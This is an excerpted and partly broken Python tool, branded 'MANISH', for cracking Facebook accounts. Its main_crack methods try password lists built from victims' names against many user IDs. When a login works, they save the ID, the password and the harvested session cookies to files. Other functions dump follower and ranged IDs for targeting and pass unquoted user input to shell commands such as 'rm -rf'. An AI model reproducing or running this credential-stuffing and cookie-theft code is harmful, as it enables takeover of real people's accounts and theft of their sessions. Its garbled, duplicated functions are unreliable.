...
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝╚═════╝░
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Man Ish  X w d
\033[1;37m Facebook:            Man Ish
\033[1;37m Github  :            Man_Ish
\033[1;37m Version :            10.0
\033[1;37m------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back MANISH Menu ")
        exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[MANISH] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [MANISH-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/MANISH-OK_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/MANISH_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [MANISH-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/MANISH_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[MANISH] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [MANISH-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/MANISH_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/MANISH_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [MANISH-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[MANISH] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [MANISH-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/MANISH_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
...
def follower():
    ...
    try:
        ...
        try:
            ...
            menu()
        print(f'File Name To Dump Ids. Example /sdcard/MANISH.txt') 
        print(47*"-")
        filepath = input("Put File Name: ")
        os.system('rm -rf %s'%(filepath))
        clear()
...
def cutter():
    ...
    manish = input('Put File Name :')
    print(" ")
    manish = input('Saving Put File Name :')
    ...
    print(47*'-')
    input(f"{S} Press Enter To Back MANISH Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/MANISH.txt\n') 
        filepath = input("Put File Name: ")
...
def cutter():
    clear()
    print("Enter File Path / File Location \n")
    manisj = input('Put File Name:')
    print(" ")
    sarfraz = input('Saving Put File Name:')
    os.system('touch ' +manish)
    os.system('sort -r '+ssb+' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
    print("Removed Successful From File: " + ssb )
